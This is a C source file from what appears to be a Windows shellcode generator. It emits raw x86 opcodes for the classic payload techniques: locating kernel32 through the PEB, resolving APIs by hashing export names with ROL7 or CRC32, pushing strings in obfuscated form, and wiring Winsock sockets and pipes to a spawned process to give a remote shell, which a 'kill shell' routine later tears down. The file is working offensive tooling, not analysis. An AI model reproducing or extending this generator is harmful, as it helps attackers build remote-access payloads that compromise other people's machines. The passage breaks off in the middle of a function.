
/* declared in shge.c */
void add_c_str(struct SHGE_CONTEXT* ctx, char* v_name, char* v_value, char* v_comm);
void add_c(struct SHGE_CONTEXT* ctx, char* v_name, unsigned long v_value, char* v_comm, int n);
int add_v(struct SHGE_CONTEXT* ctx, char* v_name, char* v_type, int v_size);
void add(struct SHGE_CONTEXT* ctx, char* fmt, ...);
char* hex_num(struct SHGE_CONTEXT* ctx, unsigned long v_value, int n);

void M_lea_eax_v(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"8D85%08X|lea eax,[ebp-%s]%s",DD(-v),v_str,cmt);
  else
    add(ctx,"8D45%02X|lea eax,[ebp-%s]%s",DB(-v),v_str,cmt);
} // M_lea_eax_v

void M_mov_v_eax(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"8985%08X|mov [ebp-%s],eax%s",DD(-v),v_str,cmt);
  else
    add(ctx,"8945%02X|mov [ebp-%s],eax%s",DB(-v),v_str,cmt);
} // M_mov_v_eax

void M_sub_eax_v(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"2B85%08X|sub eax,[ebp-%s]%s",DD(-v),v_str,cmt);
  else
    add(ctx,"2B45%02X|sub eax,[ebp-%s]%s",DB(-v),v_str,cmt);
} // M_sub_eax_v

void M_mov_v_ebx(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"899D%08X|mov [ebp-%s],ebx%s",DD(-v),v_str,cmt);
  else
    add(ctx,"895D%02X|mov [ebp-%s],ebx%s",DB(-v),v_str,cmt);
} // M_mov_v_ebx

void M_mov_ebx_v(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"8B9D%08X|mov ebx,[ebp-%s]%s",DD(-v),v_str,cmt);
  else
    add(ctx,"8B5D%02X|mov ebx,[ebp-%s]%s",DB(-v),v_str,cmt);
} // M_mov_ebx_v

void M_push_v(struct SHGE_CONTEXT* ctx,char*v_str,int v,char*cmt)
{
  if (v > 128)
    add(ctx,"FFB5%08X|push $DP [ebp-%s]%s",DD(-v),v_str,cmt);
  else
    add(ctx,"FF75%02X|push $DP [ebp-%s]%s",DB(-v),v_str,cmt);
} // M_push_v

unsigned long hash(struct SHGE_CONTEXT* ctx, char* func)
{
  unsigned long h,i;
  unsigned char c;
  h = 0;
  if (ctx->opt->HASHTYPE==2) h = h ^ 0xffffffff;
  while(*func)
  {
    c = *func;
    if (ctx->opt->HASHTYPE==0)
      h = (h << 7) | (h >> (32-7));
    h ^= c;
    if (ctx->opt->HASHTYPE!=0)
    {
      for(i=0; i<8; i++)
        if (h & 1)
          h = (h>>1) ^ 0xEDB88320;
        else
          h = (h>>1);
    }
    func++;
  }
  if (ctx->opt->HASHTYPE==2) h = h ^ 0xffffffff;
  return h;
} // hash

void callAPI(struct SHGE_CONTEXT* ctx, char* func, unsigned long ID, unsigned long addr, char* c_name)
{

  if (ctx->opt->DIRECT_API)
  {
    if (ctx->opt->MACRO_CALL)
    {

      add(ctx,"|%s %s",
        ID==ctx->opt->K32_ID?ctx->m_callK32:ctx->m_callWS2,
        c_name );

      add(ctx,"B8%08X|",DD(addr));
      add(ctx,"FFD0|");

    }
    else // !MACRO_CALL
    {
      add(ctx,"B8%08X|mov eax,%s",DD(addr), c_name);
      add(ctx,"FFD0|call eax");
    } // !MACRO_CALL

  } // !DIRECT_API
  else
  {
    if (ctx->opt->MACRO_CALL)
    {

      add(ctx,"|%s %s",
        ID==ctx->opt->K32_ID?ctx->m_callK32:ctx->m_callWS2,
        c_name,
        func );

      if (ctx->v_ptr2callbyhash > 128)
        add(ctx,"FF95%08X|",DD(-ctx->v_ptr2callbyhash));
      else
        add(ctx,"FF55%02X|",DB(-ctx->v_ptr2callbyhash));

      add(ctx,"%02X|",ID);
      add(ctx,"%08X|",DD(hash(ctx,func)));

    }
    else // !MACRO_CALL
    {

      if (ctx->v_ptr2callbyhash > 128)
        add(ctx,"FF95%08X|call $DP [ebp-%s]",DD(-ctx->v_ptr2callbyhash),ctx->x_ptr2callbyhash);
      else
        add(ctx,"FF55%02X|call $DP [ebp-%s]",DB(-ctx->v_ptr2callbyhash),ctx->x_ptr2callbyhash);

      add(ctx,"%02X|db %s",ID,ID==ctx->opt->K32_ID?ctx->c_K32_ID:ctx->c_WS2_ID);
      add(ctx,"%08X|dd %s",DD(hash(ctx,func)),c_name);

    } // !MACRO_CALL
  } // !DIRECT_API
} // callAPI

void callK32(struct SHGE_CONTEXT* ctx, char* func)
{
  if (!strcmp(func, "GlobalAlloc"        )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GlobalAlloc        ,ctx->a_K32_GlobalAlloc        ); else
  if (!strcmp(func, "GlobalFree"         )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GlobalFree         ,ctx->a_K32_GlobalFree         ); else
  if (!strcmp(func, "CreateThread"       )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_CreateThread       ,ctx->a_K32_CreateThread       ); else
  if (!strcmp(func, "CloseHandle"        )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_CloseHandle        ,ctx->a_K32_CloseHandle        ); else
  if (!strcmp(func, "CreatePipe"         )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_CreatePipe         ,ctx->a_K32_CreatePipe         ); else
  if (!strcmp(func, "CreateProcessA"     )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_CreateProcessA     ,ctx->a_K32_CreateProcessA     ); else
  if (!strcmp(func, "GetExitCodeProcess" )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GetExitCodeProcess ,ctx->a_K32_GetExitCodeProcess ); else
  if (!strcmp(func, "PeekNamedPipe"      )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_PeekNamedPipe      ,ctx->a_K32_PeekNamedPipe      ); else
  if (!strcmp(func, "ReadFile"           )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_ReadFile           ,ctx->a_K32_ReadFile           ); else
  if (!strcmp(func, "WriteFile"          )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_WriteFile          ,ctx->a_K32_WriteFile          ); else
  if (!strcmp(func, "TerminateProcess"   )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_TerminateProcess   ,ctx->a_K32_TerminateProcess   ); else
  if (!strcmp(func, "ExitThread"         )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_ExitThread         ,ctx->a_K32_ExitThread         ); else
  if (!strcmp(func, "CreateMutexA"       )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_CreateMutexA       ,ctx->a_K32_CreateMutexA       ); else
  if (!strcmp(func, "GetLastError"       )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GetLastError       ,ctx->a_K32_GetLastError       ); else
  if (!strcmp(func, "Sleep"              )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_Sleep              ,ctx->a_K32_Sleep              ); else
  if (!strcmp(func, "GetVersion"         )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GetVersion         ,ctx->a_K32_GetVersion         ); else
  if (!strcmp(func, "LoadLibraryA"       )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_LoadLibraryA       ,ctx->a_K32_LoadLibraryA       ); else
  if (!strcmp(func, "WaitForSingleObject")) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_WaitForSingleObject,ctx->a_K32_WaitForSingleObject); else
  if (!strcmp(func, "GetTickCount"       )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GetTickCount       ,ctx->a_K32_GetTickCount       ); else
//  if (!strcmp(func, "GetProcAddress"     )) callAPI(ctx,func,ctx->opt->K32_ID,ctx->opt->API_K32_GetProcAddress     ,ctx->a_K32_GetProcAddress     ); else
  {
    //fprintf(stderr,"%s\n",func);
    //assert(0);
  }
} // callK32

void callWS2(struct SHGE_CONTEXT* ctx, char* func)
{
  if (!strcmp(func, "WSAStartup"         )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_WSAStartup         ,ctx->a_WS2_WSAStartup         ); else
  if (!strcmp(func, "socket"             )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_socket             ,ctx->a_WS2_socket             ); else
  if (!strcmp(func, "setsockopt"         )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_setsockopt         ,ctx->a_WS2_setsockopt         ); else
  if (!strcmp(func, "closesocket"        )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_closesocket        ,ctx->a_WS2_closesocket        ); else
  if (!strcmp(func, "connect"            )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_connect            ,ctx->a_WS2_connect            ); else
  if (!strcmp(func, "gethostbyname"      )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_gethostbyname      ,ctx->a_WS2_gethostbyname      ); else
  if (!strcmp(func, "select"             )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_select             ,ctx->a_WS2_select             ); else
  if (!strcmp(func, "bind"               )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_bind               ,ctx->a_WS2_bind               ); else
  if (!strcmp(func, "listen"             )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_listen             ,ctx->a_WS2_listen             ); else
  if (!strcmp(func, "accept"             )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_accept             ,ctx->a_WS2_accept             ); else
  if (!strcmp(func, "send"               )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_send               ,ctx->a_WS2_send               ); else
  if (!strcmp(func, "recv"               )) callAPI(ctx,func,ctx->opt->WS2_ID,ctx->opt->API_WS2_recv               ,ctx->a_WS2_recv               ); else
  {
    //fprintf(stderr,"%s\n",func);
    //assert(0);
  }
} // callWS2

void shge_chr(char* dst, unsigned char c)
{
  if (c==0) strcpy(dst,"\\0"); else
  if (c=='\\') strcpy(dst,"\\\\"); else
  if (c=='\r') strcpy(dst,"\\r"); else
  if (c=='\n') strcpy(dst,"\\n"); else
  if ((c<32)||(c>128)) sprintf(dst, "\\x%02X", (unsigned)c); else
  sprintf(dst, "%c", c);
}

void X_DB(struct SHGE_CONTEXT* ctx, char* str,int ldz)
{
  char s1[10];
  unsigned char* s;
  s = (unsigned char*)str;
  while(*s)
  {
    shge_chr(s1, *s);
    add(ctx,"%02X|db %s;'%s'",*s,hex_num(ctx,*s,2),s1);
    s++;
  }
  if (ldz)
  {
    add(ctx,"00|db 0;end of string");
  }
} // X_DB

void X_PUSH(struct SHGE_CONTEXT* ctx, char* str,int ldz)
{
  char s1[10],s2[10],s3[10],s4[10];
  int i, j;
  unsigned long d, r;

  if (ldz)
    add(ctx,";push('%s\\0')",str);
  else
    add(ctx,";push('%s')",str);
  ctx->x_size = 0;

  add(ctx,"33C0|xor eax,eax");

  r = 0;
  d = 0;
  j = 0;
  for(i=(((int)strlen(str)+ldz+3)&(~3))-1; i>=0; i--)
  {
    d = (d << 8) | ((unsigned char)str[i]);
    if ((i%4)==0)
    {
      if ((j%3)==0)
      {
        if ( ((signed)(r-d) >= -128) &&
             ((signed)(r-d) <=  127) )
          add(ctx,"83E8%02X|sub eax,%s",DB((r-d)&0xFF),hex_num(ctx,r-d,2));
        else
          add(ctx,"2D%08X|sub eax,%s",DD(r-d),hex_num(ctx,r-d,8));
      }
      else
      if ((j%3)==1)
      {
        add(ctx,"35%08X|xor eax,%s",DD(r^d),hex_num(ctx,r^d,8));
      }
      else
      if ((j%3)==2)
      {
        add(ctx,"05%08X|add eax,%s",DD(d-r),hex_num(ctx,d-r,8));
      }
      shge_chr(s1,str[i+0]);
      shge_chr(s2,str[i+1]);
      shge_chr(s3,str[i+2]);
      shge_chr(s4,str[i+3]);
      add(ctx,"50|push eax;push('%s%s%s%s')", s1,s2,s3,s4);
      ctx->x_size += 4;
      r = d;
      d = 0;
      j++;
    }
  }

} // X_PUSH

void X_POP(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";free memory, %d bytes",ctx->x_size);
  if ((ctx->x_size >= 4) && (ctx->x_size <= 12))
  {
    while(ctx->x_size)
    {
      add(ctx,"59|pop ecx;free");
      ctx->x_size -= 4;
    }
  }
  else
  {
    if (ctx->x_size>=128)
      add(ctx,"81C4%08X|add esp,%d",DD(ctx->x_size),ctx->x_size);
    else
      add(ctx,"83C4%02X|add esp,%d",DB(ctx->x_size),ctx->x_size);
  }
} // X_POP

void X_POP_KEEPFLAGS(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";free memory, %d bytes (keep flags)",ctx->x_size);
  if ((ctx->x_size >= 4) && (ctx->x_size <= 16))
  {
    while(ctx->x_size)
    {
      add(ctx,"59|pop ecx;free");
      ctx->x_size -= 4;
    }
  }
  else
  {
    if (ctx->x_size > 128)
      add(ctx,"8DA424%08X|lea esp,[esp+%d]",DD(ctx->x_size),ctx->x_size);
    else
      add(ctx,"8D6424%02X|lea esp,[esp+%d]",DB(ctx->x_size),ctx->x_size);
  }
} // X_POP_KEEPFLAGS

void M_INIT_real(struct SHGE_CONTEXT* ctx, char* l1, char* l2)
{

  add(ctx,";zerofill stack vars");
  add(ctx,"B9%08X|mov ecx,%s",DD(ctx->v_stack_size),ctx->c_stack_size);
  add(ctx,"8BFD|mov edi,ebp");
  add(ctx,"2BF9|sub edi,ecx");
  add(ctx,"33C0|xor eax,eax");
  add(ctx,"FC|cld");
  add(ctx,"F3AA|rep stosb");

  if (!ctx->opt->DIRECT_API)
  {
    add(ctx,";set %s",ctx->x_ptr2callbyhash);

    add(ctx,"call %s",l1);
    add(ctx,"jmp %s", ctx->l___call_by_hash__);
    add(ctx,"%s:",l1);

    if (ctx->v_ptr2callbyhash > 128)
      add(ctx,"8F85%08X|pop $DP [ebp-%s]",DD(-ctx->v_ptr2callbyhash),ctx->x_ptr2callbyhash);
    else
      add(ctx,"8F45%02X|pop $DP [ebp-%s]",DB(-ctx->v_ptr2callbyhash),ctx->x_ptr2callbyhash);

  }

  add(ctx,";load ws2 dll");

  if (ctx->opt->USE_XPUSH_STRINGS)
  {
    X_PUSH(ctx,ctx->opt->str_ws2,1);
    add(ctx,"54|push esp;ptr to dll name");
  }
  else // !USE_XPUSH_STRINGS
  {
    add(ctx,"call %s;ptr to dll name",l2);
    X_DB(ctx,ctx->opt->str_ws2,1);
    add(ctx,"%s:",l2);
  } // !USE_XPUSH_STRINGS

  callK32(ctx,"LoadLibraryA");

  if (ctx->opt->USE_XPUSH_STRINGS)
  {
    X_POP(ctx);
  } // !USE_XPUSH_STRINGS

  if (!ctx->opt->DIRECT_API)
  {
    add(ctx,";save %s", ctx->x_ws2_base);
    M_mov_v_eax(ctx,ctx->x_ws2_base,ctx->v_ws2_base,"");
  } // !DIRECT_API

  if (ctx->opt->ALLOC_BUF)
  {
    add(ctx,";allocate io buf");
    if (ctx->opt->MAXBUFSIZE >= 128)
      add(ctx,"68%08X|push %s",DD(ctx->opt->MAXBUFSIZE),ctx->c_MAXBUFSIZE);
    else
      add(ctx,"6A%02X|push %s",DB(ctx->opt->MAXBUFSIZE),ctx->c_MAXBUFSIZE);
    add(ctx,"53|push ebx;0");
    callK32(ctx,"GlobalAlloc");
    add(ctx,";set EDI = io buf");
    add(ctx,"97|xchg edi,eax");
  }
  else // !ctx->opt->ALLOC_BUF
  {
    add(ctx,";set EDI = io buf, i.e. ptr to [ebp-%s]",ctx->x_buf);

    if (ctx->v_buf > 128)
      add(ctx,"8DBD%08X|lea edi,[ebp-%s];EDI=io buf",DD(-ctx->v_buf),ctx->x_buf);
    else
      add(ctx,"8D7D%02X|lea edi,[ebp-%s];EDI=io buf",DB(-ctx->v_buf),ctx->x_buf);
  } // !ctx->opt->ALLOC_BUF

} // M_INIT_real

void M_INIT(struct SHGE_CONTEXT* ctx, int npass, char* l1, char* l2)
{
  if (ctx->opt->SUB_INIT == 0)
  {
    if (npass == 0)
    {
      M_INIT_real(ctx, l1, l2);
    }
  }
  else // sub
  {
    if (npass == 0)
    {

      add(ctx,";initialize local vars");
      add(ctx,"call %s", ctx->l___init__);

    }
    else // npass==1
    {

      add_struct(ctx, "init();");

      add(ctx,";initialize local vars");
      add(ctx,"%s:", ctx->l___init__);

      M_INIT_real(ctx, l1, l2);

      add(ctx,"C3|retn");
    }
  }
} // M_INIT

void M_FINDBASE_real(struct SHGE_CONTEXT* ctx, char*l1, char*l2)
{
  add(ctx,"6633DB|xor bx,bx;and ebx,not (65536-1)");
  add(ctx,"jmp %s",l1);
  add(ctx,"%s:",l2);
  add(ctx,"81EB00000100|sub ebx,65536");
  add(ctx,"%s:",l1);


  add(ctx,"8B03|mov eax,[ebx]");
  add(ctx,"F7D0|not eax");
  add(ctx,"663DB2A5|cmp ax,%s;not 'MZ'",hex_num(ctx,0xA5B2,4));

  add(ctx,"jne %s",l2);
} // M_FINDBASE_real

void M_FINDBASE(struct SHGE_CONTEXT* ctx, int npass, char*l1, char*l2)
{
  add(ctx,";scan backwards, by 64k, to find some image base");

  if (ctx->opt->SUB_FINDBASE)
  {

    if (npass==1)
    {
      add(ctx,"call %s", ctx->l___findbase__);
    }
    else
    {
      add(ctx,"%s:", ctx->l___findbase__);
      M_FINDBASE_real(ctx,l1,l2);
      add(ctx,"C3|retn");
    }

  }
  else
  {
    M_FINDBASE_real(ctx,l1,l2);
  }
} // M_FINDBASE

void M_FIND_KERNEL32_BASE(struct SHGE_CONTEXT* ctx)
{

  if (ctx->opt->USE_OLDWAY_2FIND_K32)
  {
    add(ctx,";find kernel32 base (using old method)");

    add(ctx,"33DB|xor ebx,ebx");
    if (ctx->opt->SYNTAX==0)
      add(ctx,"648B03|mov eax,fs:[ebx];EBX==0");
    else
      add(ctx,"648B03|mov eax,[fs:ebx];EBX==0");
    add(ctx,"%s:", ctx->l___kb_cycle1__);
    add(ctx,"8338FF|cmp $DP [eax],-1");
    add(ctx,"8B5804|mov ebx,[eax+4]");
    add(ctx,"8B00|mov eax,[eax]");
    add(ctx,"jnz %s", ctx->l___kb_cycle1__);

    M_FINDBASE(ctx,1,ctx->l___fb_start_1__,ctx->l___fb_cycle_1__);

    add(ctx,"8B533C|mov edx,[ebx+3Ch];PE header");
    add(ctx,"8B941380000000|mov edx,[ebx+edx+%s];ImportTableRVA",hex_num(ctx,0x80,2));
    add(ctx,"%s:", ctx->l___kb_cycle2__);
    add(ctx,"8B4C130C|mov ecx,[ebx+edx+%s];dll name",hex_num(ctx,0x0C,2));
    add(ctx,"0BC9|or ecx,ecx");
    add(ctx,"jz %s", ctx->l___kb_found__);
    add(ctx,"83C214|add edx,20;go to next import entry");
    add(ctx,"8B040B|mov eax,[ebx+ecx];'KERN'");
    add(ctx,"33440B04|xor eax,[ebx+ecx+4];'EL32'");
    add(ctx,"3D0E09617C|cmp eax,%s;'KERN' xor 'EL32'",hex_num(ctx,0x7C61090E,8));
    add(ctx,"jne %s", ctx->l___kb_cycle2__);
    add(ctx,"8B4C13FC|mov ecx, [ebx+edx-20+%s];AddressTableRVA",hex_num(ctx,0x10,2));
    add(ctx,"8B1C0B|mov ebx, [ebx+ecx];kernel's proc addr");

    M_FINDBASE(ctx,1,ctx->l___fb_start_2__,ctx->l___fb_cycle_2__);

    add(ctx,"%s:", ctx->l___kb_found__);

  }
  else // !USE_OLDWAY_2FIND_K32
  {
    add(ctx,";find kernel32 base");

    if (ctx->opt->SYNTAX==0)
      add(ctx,"64678B1E3000|mov ebx,fs:[%s];EAX=PEB base",hex_num(ctx,0x30,4));
    else
      add(ctx,"64678B1E3000|mov ebx,[fs:word %s];EAX=PEB base",hex_num(ctx,0x30,4));

    if (ctx->opt->SUPPORT_WIN9X)
    {
      add(ctx,"0BDB|or ebx,ebx");
      add(ctx,"js %s", ctx->l___kb_win9x__);
    } // !SUPPORT_WIN9X

    add(ctx,"8B5B0C|mov ebx,[ebx+%s];EAX=PEB_LDR_DATA",hex_num(ctx,0x0C,2));
    add(ctx,"8B731C|mov esi,[ebx+%s];InitOrderModuleList 1st entry",hex_num(ctx,0x1C,2));
    add(ctx,"AD|lodsd;next entry");
    add(ctx,"8B5808|mov ebx,[eax+8];K32 imagebase");

    if (ctx->opt->SUPPORT_WIN9X)
    {
      add(ctx,"jmp %s", ctx->l___kb_found__);
      add(ctx,"%s:", ctx->l___kb_win9x__);
      add(ctx,"8B5B34|mov ebx,[ebx+%s];???",hex_num(ctx,0x34,2));
      add(ctx,"8B9BB8000000|mov ebx,[ebx+%s];??? i'm not sure it worx",hex_num(ctx,0xB8,2));
      add(ctx,"%s:", ctx->l___kb_found__);
    } // !SUPPORT_WIN9X

  } // !USE_OLDWAY_2FIND_K32

} // M_FIND_KERNEL32_BASE

void M_CALL_BY_HASH(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";this address is stored into %s local variable,",ctx->x_ptr2callbyhash);
  add(ctx,";to do call [ebp-xx] (3 const bytes) instead of E8 xxxxxxxx (5 var bytes)");
  add(ctx,";used by callK32 && callWS2 macros");

  add(ctx,"5E|pop esi");
  add(ctx,"AC|lodsb");
  add(ctx,"3C%02X|cmp al, %s",ctx->opt->WS2_ID,ctx->c_WS2_ID);
  add(ctx,"AD|lodsd");
  add(ctx,"60|pusha");

  if (ctx->v_ws2_base > 128)
    add(ctx,"8B9D%08X|mov ebx, [ebp-%s]",DD(-ctx->v_ws2_base),ctx->x_ws2_base);
  else
    add(ctx,"8B5D%02X|mov ebx, [ebp-%s]",DB(-ctx->v_ws2_base),ctx->x_ws2_base);

  add(ctx,"je %s", ctx->l___base_found__);

  M_FIND_KERNEL32_BASE(ctx);

  add(ctx,"%s:", ctx->l___base_found__);

  add(ctx,"8B4B3C|mov ecx,[ebx+%s];ECX = pe header",hex_num(ctx,0x3C,2));
  add(ctx,"8B4C1978|mov ecx,[ecx+ebx+%s];ECX = export rva",hex_num(ctx,0x78,2));
  add(ctx,"03CB|add ecx,ebx;ECX = export va");

  add(ctx,"33F6|xor esi,esi;for each func, ESI = index");

  add(ctx,"%s:", ctx->l___search_cycle__);

  add(ctx,"8D14B3|lea edx,[esi*4+ebx]");
  add(ctx,"035120|add edx,[ecx+%s];ex_namepointersrva",hex_num(ctx,0x20,2));
  add(ctx,"8B12|mov edx,[edx];name va");
  add(ctx,"03D3|add edx,ebx;+imagebase");

  add(ctx,";calculate api hash");

  if (ctx->opt->HASHTYPE==2) // 2=std crc32
  {
    add(ctx,"6AFF|push -1");
    add(ctx,"58|pop eax");
  }
  else
  {
    add(ctx,"33C0|xor eax,eax");
  }

  add(ctx,"%s:", ctx->l___calc_hash__);

  if (ctx->opt->HASHTYPE==0)
  {
    add(ctx,"C1C007|rol eax,7");          // 0==Z
  }

  add(ctx,"3202|xor al,[edx]");
  add(ctx,"42|inc edx");

  if (ctx->opt->HASHTYPE!=0)
  {
    add(ctx,"6A08|push 8");
    add(ctx,"5F|pop edi");
    add(ctx,"%s:",ctx->l___crc32a__);
    add(ctx,"D1E8|shr eax,1");
    add(ctx,"jnc %s",ctx->l___crc32b__);
    add(ctx,"352083B8ED|xor eax,%s",hex_num(ctx,0xEDB88320,8));
    add(ctx,"%s:",ctx->l___crc32b__);
    add(ctx,"4F|dec edi");
    add(ctx,"jnz %s",ctx->l___crc32a__);
  }

  add(ctx,"803A00|cmp $BP [edx],0");
  add(ctx,"jne %s", ctx->l___calc_hash__);

  if (ctx->opt->HASHTYPE==2) // 2=std crc32
    add(ctx,"F7D0|not eax");

  add(ctx,"3B44241C|cmp eax,[esp+7*4];compare hashs (PUSHA.EAX)");
  add(ctx,"je %s", ctx->l___name_found__);

  add(ctx,"46|inc esi;index++");
  add(ctx,"3B7118|cmp esi, [ecx+%s];ex_numofnamepointers",hex_num(ctx,0x18,2));
  add(ctx,"jb %s", ctx->l___search_cycle__);

  add(ctx,";should never get here");

  add(ctx,"%s:", ctx->l___name_found__);

  add(ctx,"8B5124|mov edx,[ecx+%s];ex_ordinaltablerva",hex_num(ctx,0x24,2));
  add(ctx,"03D3|add edx,ebx;+imagebase");
  add(ctx,"0FB71472|movzx edx,$WP [edx+esi*2];edx=current ordinal");
  add(ctx,"8B411C|mov eax,[ecx+%s];ex_addresstablerva",hex_num(ctx,0x1C,2));
  add(ctx,"03C3|add eax,ebx;+imagebase");
  add(ctx,"8B0490|mov eax,[eax+edx*4];eax=current address");
  add(ctx,"03C3|add eax,ebx;+imagebase");

  if (ctx->opt->USE_LASTCALL)
  {
    add(ctx,";%s local var is used temporarily, only by this subroutine",ctx->x_lastcall);

    M_mov_v_eax(ctx, ctx->x_lastcall, ctx->v_lastcall, "");
    add(ctx,"61|popa");

    if (ctx->v_lastcall > 128)
      add(ctx,"FF95%08X|call $DP [ebp-%s]",DD(-ctx->v_lastcall),ctx->x_lastcall);
    else
      add(ctx,"FF55%02X|call $DP [ebp-%s]",DB(-ctx->v_lastcall),ctx->x_lastcall);

    add(ctx,"09C0|or eax,eax");
    add(ctx,"56|push esi");

    if (ctx->v_lastcall > 128)
      add(ctx,"8BB5%08X|mov esi, [ebp-%s]",DD(-ctx->v_lastcall),ctx->x_lastcall);
    else
      add(ctx,"8B75%02X|mov esi, [ebp-%s]",DB(-ctx->v_lastcall),ctx->x_lastcall);

    add(ctx,"C3|retn");

    add(ctx,";on return:");
    add(ctx,";ESI    = just called subroutine's address");
    add(ctx,";EFlags = result of OR EAX,EAX");
  }
  else // !USE_LASTCALL
  {
    add(ctx,"8944241C|mov [esp+4*7],eax;popa.eax");
    add(ctx,"61|popa");
    add(ctx,"FFD0|call eax");
    add(ctx,"09C0|or eax, eax");
    add(ctx,"FFE6|jmp esi");
    add(ctx,";on return:");
    add(ctx,";EFlags = result of OR EAX,EAX");
  } // !USE_LASTCALL

} // M_CALL_BY_HASH

void M_CLOSE_SOCKET(struct SHGE_CONTEXT* ctx, char* sock_str, int v_sock)
{
  add(ctx,";close socket: %s", sock_str);

  M_push_v(ctx, sock_str, v_sock, "");
  callWS2(ctx,"closesocket");
  M_mov_v_ebx(ctx, sock_str, v_sock, ";zero socket handle");
} // M_CLOSE_SOCKET

void M_EXITTHREAD(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";exit from thread");

  add(ctx,"53|push ebx;thread exit code");
  callK32(ctx,"ExitThread");

} // M_EXITTHREAD

void M_FREEBUF(struct SHGE_CONTEXT* ctx)
{
  add(ctx,";free io buffer");

  add(ctx,"57|push edi;ptr to allocated buffer");
  callK32(ctx,"GlobalFree");

} // M_FREEBUF

void M_SOCKET_WSA(struct SHGE_CONTEXT* ctx, char* sock_str, int v_sock)
{

  add(ctx,";create socket: %s", sock_str);

  if (ctx->opt->DO_WSA_STARTUP)
  {
    add(ctx,"%s:", ctx->l___sw_retry__);
  }

  add(ctx,"53|push ebx;0=IPPROTO_IP");
  add(ctx,"6A01|push 1;SOCK_STREAM");
  add(ctx,"6A02|push 2;AF_INET");
  callWS2(ctx,"socket");

  M_mov_v_eax(ctx,sock_str,v_sock,"");

  if (ctx->opt->DO_WSA_STARTUP)
  {
    add_struct(ctx,"if cant create socket, call WSAStartup() and retry;");

    add(ctx,"40|inc eax;check for -1==INVALID_SOCKET");
    add(ctx,"jnz %s", ctx->l___sw_socket_ok__);
    add(ctx,";do WSAStartup");
    add(ctx,"57|push edi;io buf");
    add(ctx,"6801010000|push %s;version = MAKEWORD(1,1)",hex_num(ctx,0x0101,4));
    callWS2(ctx,"WSAStartup");
    add(ctx,"jmp %s", ctx->l___sw_retry__);
    add(ctx,"%s:", ctx->l___sw_socket_ok__);
  } // DO_WSA_STARTUP

} // M_SOCKET_WSA

void M_KILL_SHELL(struct SHGE_CONTEXT* ctx)
{
  char s[256];

  add(ctx,";terminate shell && close pipe handles");

  sprintf(s,"%s+0", ctx->x_processinfo);

  add(ctx,"53|push ebx;process exit code");
  M_push_v(ctx,s,ctx->v_processinfo+0,";hProcess");
  callK32(ctx,"TerminateProcess");

  M_push_v(ctx,s,ctx->v_processinfo+0,";hProcess");
  callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,s,ctx->v_processinfo+0,";hProcess<--0");

  sprintf(s,"%s+4", ctx->x_processinfo);

  M_push_v(ctx,s,ctx->v_processinfo-4,";hThread");
  if (ctx->opt->USE_LASTCALL)
    add(ctx,"FFD6|call esi;ESI==last called api");
  else
    callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,s,ctx->v_processinfo-4,";hThread<--0");

  M_push_v(ctx,ctx->x_rp1,ctx->v_rp1,";pipe");
  if (ctx->opt->USE_LASTCALL)
    add(ctx,"FFD6|call esi;ESI==last called api");
  else
    callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,ctx->x_rp1,ctx->v_rp1,"");

  M_push_v(ctx,ctx->x_rp2,ctx->v_rp2,";pipe");
  if (ctx->opt->USE_LASTCALL)
    add(ctx,"FFD6|call esi;ESI==last called api");
  else
    callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,ctx->x_rp2,ctx->v_rp2,"");

  M_push_v(ctx,ctx->x_wp1,ctx->v_wp1,";pipe");
  if (ctx->opt->USE_LASTCALL)
    add(ctx,"FFD6|call esi;ESI==last called api");
  else
    callK32(ctx,"CloseHandle");
  M_mov_v_ebx(ctx,ctx->x_wp1,ctx->v_wp1,"");

